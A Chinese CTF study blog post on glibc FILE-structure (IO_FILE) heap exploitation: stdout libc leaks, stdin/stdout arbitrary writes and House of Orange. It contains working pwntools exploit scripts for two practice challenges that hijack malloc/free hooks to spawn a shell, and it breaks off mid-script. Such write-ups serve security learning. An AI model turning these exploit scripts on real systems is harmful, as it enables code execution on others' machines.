<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="小小pwn">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="小小pwn">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="和方煜">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>小小pwn</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">小小pwn</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/IO/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/IO/" class="post-title-link" itemprop="url">IO</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 12:57:04 / 修改时间：13:03:17" itemprop="dateCreated datePublished" datetime="2025-11-18T12:57:04+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>27 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h1 id="1-利用stdout泄露libc"><a href="#1-利用stdout泄露libc" class="headerlink" title="1.利用stdout泄露libc"></a>1.利用stdout泄露libc</h1><ol>
<li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li>
<li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li>
<li>设置<code>_fileno</code>为1。</li>
<li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li>
<li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li>
<li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）（fwrite）</li>
</ol>
<p>泄露libc 将结构体内容覆盖</p>
<ul>
<li>泄露 <code>_IO_file_jumps</code> 的写法：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+b<span class="string">&quot;\x58&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>泄露 <code>_IO_2_1_stdin_</code> 的写法：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>三个p64(0)为了覆盖 _IO_read_ptr、 _IO_read_end、 _IO_read_base，这几个没什么用所以直接覆盖0就行，最后 b’\x00’再把 _IO_write_base的最后一字节改成00，假设一开始_IO_write_base&#x3D;_IO_write_end&#x3D;0xffff,则此时_IO_write_base&#x3D;0xff00,再次调用puts或者write就会把0xff00-0xffff之间内容打出来，里面会有libc相关地址，也就达成了泄露目的。</p>
<p>思路：想篡改stdout需要先拿到它的地址，通常是通过main_arena地址间接拿到stdout地址（爆破一字节）</p>
<p>一个堆块在unsortbin与fastbin，这样他的fd就是main_arena+88，覆盖后面四个字节，但是倒数第四个需要爆破，fastbin attack就能实现申请到了</p>
<h2 id="例题1-UAF-堆风水"><a href="#例题1-UAF-堆风水" class="headerlink" title="例题1 UAF 堆风水"></a>例题1 UAF 堆风水</h2><p><img src="/2025/11/18/IO/1754547115898-652df905-3171-40f4-be4d-d9e02272534c.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">2</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">3</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+b<span class="string">&#x27;\x71&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+b<span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,b<span class="string">&#x27;\x70&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>只能创建0x60的堆块，UAF漏洞，堆风水具体如何实现</p>
<p>代码就是这一部分</p>
<p>为什么先free1，后free0，因为我们要改堆块1的size位位0xe1，这就需要先把堆块1往小地址改一点，通过这个假的堆块1，将真正的堆块1的size位改了，应为又uaf所以free了指针也不会被清零，具体实现</p>
<p><img src="/2025/11/18/IO/1754547614309-b932fa2f-4cde-46bd-983b-ef3f7d7b8cd1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0,b&#x27;\x50&#x27;)</span><br></pre></td></tr></table></figure>

<p>先free挂入链表，将堆块0的fd改为50，也就是将堆块1前一一点点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,4,p64(0)*9+b&#x27;\x71&#x27;)</span><br></pre></td></tr></table></figure>

<p>这个其实就是堆块0，后入先出，伪造假堆块1的size位，我们看一下</p>
<p><img src="/2025/11/18/IO/1754547992628-e520b216-4779-4ad5-a284-93cd353de8d1.png" alt="img"></p>
<p>可以看到成功在50处伪造了size位，这时我们申请堆块5，就会申请到50那个地方（看bins）并且可以通过这个改真正堆块1的size位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,5,p64(0)*3+b&#x27;\xe1&#x27;)</span><br></pre></td></tr></table></figure>

<p>![img]1754548159692-6e637918-479e-4585-9d6b-bccaaa2df6f1.png)</p>
<p>可以看到该成功了</p>
<p>然后</p>
<p>free(1)</p>
<p>free(0)</p>
<p>free(2)</p>
<p>这样堆块1就会进入unsortbin，堆块0，2进入fastbin，2-&gt;0</p>
<p><img src="/2025/11/18/IO/1754548529026-b3229780-a730-46f2-9e96-a8f9cffe611d.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(2,b&#x27;\x70&#x27;)</span><br></pre></td></tr></table></figure>

<p>然后修改堆块2的fd，将00，改成70，这样unsortbin就被挂入fastbin</p>
<p><img src="/2025/11/18/IO/1754548869956-5f00fed4-ecfc-43b3-8c73-757f372f696b.png" alt="img"></p>
<p>然后改一下堆块2fd &#x3D; main_arena+88后两字节，倒数第四位需要爆破一下，但是这个虽然被挂进去了，我们发现堆块2的size位还是0xe1，这样即使挂进去了也申请不出来，我们不能直接edit(2)</p>
<p>应该</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(5,p64(0)*3+b&#x27;\x71&#x27;+b&#x27;\x00&#x27;*7+b&#x27;\xdd\x55&#x27;)</span><br></pre></td></tr></table></figure>

<p>再往后申请三次就出来了，然后正常改结构就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,6,b&#x27;aaaa&#x27;)</span><br><span class="line">add(0x60,7,b&#x27;aaaa&#x27;)</span><br><span class="line">payload = b&#x27;\x00&#x27;*51+p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27; #studin</span><br><span class="line">add(0x60,8,payload)</span><br></pre></td></tr></table></figure>

<p>再往后打malloc就行，这里又学到了一点，正常是需要realloc来调整栈的，但是直接触发double free就可以，不用调整</p>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">2</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x50&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x70&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x71&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xdd\x55&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"><span class="comment">#payload = b&#x27;\x00&#x27;*51+p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27; #studin</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">51</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&quot;\x58&quot;</span>   <span class="comment">#io file jmp</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,payload)</span><br><span class="line">buf= u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;buf = &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line">bug()</span><br><span class="line">pause()</span><br><span class="line">libc_base = buf-<span class="number">0x3c5600</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">addr = libc_base +<span class="number">0x3c4aed</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(addr))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">shell = libc_base+<span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(shell)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="例题2数组越界"><a href="#例题2数组越界" class="headerlink" title="例题2数组越界"></a>例题2数组越界</h2><p><img src="/2025/11/18/IO/1754546302990-8925b85e-1d77-4a36-91ee-56b7c2340d0d.png" alt="img"></p>
<p>v1没有规定正，数组越界，通过二级指针可以改内容，就是改一个地址里面存了的一个地址，这个地址的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">add(b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(b<span class="number">&#x27;b</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">add(b&#x27;</span>c<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">add(b&#x27;</span>d<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-11</span><span class="string">&#x27;,b&#x27;</span>\x48<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-8</span><span class="string">&#x27;,p64(0xfbad1800)+p64(0)*3+b&#x27;</span>\x00<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc_ = get_address()</span></span><br><span class="line"><span class="string">print(hex(libc_))</span></span><br><span class="line"><span class="string">libc_base = libc_ - 0x1EB980-0x1000</span></span><br><span class="line"><span class="string">print(hex(libc_base))</span></span><br><span class="line"><span class="string">system_ = libc_base + libc.sym[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">print(&quot;system --&gt; &quot;+hex(system_))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">iolistall =  libc_base + libc.sym[&#x27;</span>_IO_list_all<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">print(&quot;IO_list_all --&gt; &quot;+hex(iolistall))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bin_sh=libc_base+next(libc.search(b&#x27;</span>/bin/sh<span class="string">&#x27;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;</span>__free_hook<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">print(&quot;free_hook --&gt; &quot;+hex(free_hook))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-11</span><span class="string">&#x27;,p64(free_hook))</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-3</span><span class="string">&#x27;,p64(system_))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">2</span><span class="string">&#x27;,b&#x27;</span>/bin/sh\x00<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dele(b&#x27;</span><span class="number">2</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>首先我们看一下</p>
<p>edit(b’-11’,b’\x48’)这个</p>
<p><img src="/2025/11/18/IO/1754546583048-fc4d30e8-bba9-4629-a551-08e7cac4fad5.png" alt="img"><br>我们可以看到他这个是指向自己的，也就是通过二级指针该自己的内容，那我们可以把他改成别的来看一下</p>
<p><img src="/2025/11/18/IO/1754546649761-9cb83f94-8426-46c4-950a-de98fe7e36ec.png" alt="img"></p>
<p>就像这样</p>
<p>edit(b’-11’,p64(free_hook))</p>
<p>然后我们改他把free_hook写进去，然后通过completed这个指针就可以改free_hook的内容了</p>
<p>edit(b’-3’,p64(system_))</p>
<p><img src="/2025/11/18/IO/1754546775684-81f42a87-84ef-4d01-b8b6-8532ebfb1a90.png" alt="img"></p>
<p>就像这样</p>
<p>edit(b’-8’,p64(0xfbad1800)+p64(0)*3+b’\x00’)</p>
<p>这个就是改IO_FILE的不再解释了</p>
<p><img src="/2025/11/18/IO/1754546990292-95e861ee-20cb-4e3c-ae83-fec4465f14c0.png" alt="img"></p>
<h1 id="2-stdin标准输入缓冲区进行任意地址写"><a href="#2-stdin标准输入缓冲区进行任意地址写" class="headerlink" title="2.stdin标准输入缓冲区进行任意地址写"></a>2.<code>stdin</code>标准输入缓冲区进行任意地址写</h1><ol>
<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li>
<li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（<strong>清除</strong> <code>**_flag**</code> <strong>中第 2 位</strong>）。</li>
<li>设置<code>_fileno</code>为0。</li>
<li>设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>；且使得<code>_IO_buf_end-_IO_buf_base</code>大于fread要读的数据。（fread）</li>
</ol>
<p>在<code>_IO_new_file_underflow</code>函数中先判断<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>是否成立，成立则直接返回，因此再次要求伪造的结构体<code>_IO_read_end ==_IO_read_ptr</code>，绕过该条件检查。</p>
<p>接着函数会检查<code>_flags</code>是否包含<code>_IO_NO_READS</code>标志，包含则直接返回。标志的定义是<code>#define _IO_NO_READS 4</code>，因此<code>_flags</code>不能包含<code>4</code>。</p>
<p>最终系统调用<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>读取数据，因此要想利用<code>stdin</code>输入缓冲区需设置FILE结构体中<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>。同时也需将结构体中的<code>fp-&gt;_fileno</code>设置为0，最终调用<code>read (fp-&gt;_fileno, buf, size))</code>读取数据。</p>
<p>利用：任意地址写一个0利用，将<code>_IO_buf_base</code>最后一位写成0，第二次再写就会往这里写，从而完全控制</p>
<p><img src="/2025/11/18/IO/1761139985999-f30b66a1-bc8c-4edf-a133-f72e948f4f08.png" alt="img"></p>
<h1 id="3-stdout标准输入缓冲区进行任意地址写"><a href="#3-stdout标准输入缓冲区进行任意地址写" class="headerlink" title="3.stdout标准输入缓冲区进行任意地址写"></a>3.<code>stdout</code>标准输入缓冲区进行任意地址写</h1><p>任意写功能的实现在于IO缓冲区没有满时，会先将要输出的数据复制到缓冲区中，可通过这一点来实现任意地址写的功能。可以看到任意写好像很简单，只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可（fwrite）</p>
<h1 id="4-House-of-Orange"><a href="#4-House-of-Orange" class="headerlink" title="4.House of Orange"></a>4.House of Orange</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>没有free通过改top chunk来实现，house of 系列里面讲过了</p>
<p>具体讲io部分</p>
<p><img src="/2025/11/18/IO/1756317776625-be280451-9e40-4314-844d-5f22477be507.png" alt="img"><img src="/2025/11/18/IO/1756317788120-47fd1fd8-8373-489f-9b56-83f676e39e4a.png" alt="img"></p>
<ul>
<li>通过unsortbin attack往任意地址写入一个大的值（也就是main_arean+88）这个unsortbin attack有讲忘了自己去看，我们可以往_IO_list_all写入main_arean+88，main_arean+88+0x68这个偏移就是chain字段，而这个地址刚好是smallbin中size为0x60的数组，我们往大小为0x60的smallbin中写数据就正好是往chain字段这个地址中写，就可以构造结构体</li>
</ul>
<p>具体构造</p>
<p>将_flags字段写入&#x2F;bin&#x2F;sh</p>
<p>将 _IO_write_ptr改成0x1</p>
<p>将 _IO_write_end改成0x0</p>
<p>将_mode改成0</p>
<p>将chain构造为&amp;flags</p>
<p>将vtable的地址改成&amp;vtable</p>
<p>然后在vtable字段后再跟16个字节的0最后写上system函数的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/he/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span 